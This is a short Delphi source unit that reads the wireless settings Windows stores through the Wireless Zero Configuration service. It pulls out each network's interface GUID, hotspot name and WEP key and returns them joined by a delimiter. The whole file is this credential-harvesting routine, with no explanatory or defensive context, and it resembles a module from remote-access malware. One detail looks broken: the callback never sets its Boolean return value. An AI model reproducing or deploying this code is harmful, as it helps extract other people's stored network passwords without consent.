unit UnitWep;

interface

uses
  windows, uWEPUtils;

var
  Pass: string;
  xDelimitador: String;

function ObtainWirelessPasswords(Delimitador: string): string;

implementation

function ConvertDataToAscii(Buffer: pointer; Length: Word): string;
var
  Iterator: integer;
  AsciiBuffer: string;
begin
  if Buffer = nil then exit;
  if Length = 0 then exit;
  SetString(Result,pchar(Buffer),Length);
end;

function GetDataCallBack(DataType: Cardinal; Data: Pointer; DataSize: Cardinal): Boolean;
begin
  case DataType of
    1:  //GUID della WiFi Network Interface
      begin
        Pass := Pass + PChar(Data) + xDelimitador;
      end;
    2:  //nome dell'HOT-SPOT
      begin
        Pass := Pass + PChar(Data) + xDelimitador;
      end;
    3:  //Wep Key dell'HOT-SPOT
      begin
        Pass := Pass + ConvertDataToAscii(Data, DataSize) + xDelimitador + #13#10;
      end;
  end;
end;

function ObtainWirelessPasswords(Delimitador: string): string;
begin
  xDelimitador := Delimitador;
  Pass := '';
  GetWZCSVCData(@GetDataCallBack);
  Result := Pass;
end;

end.


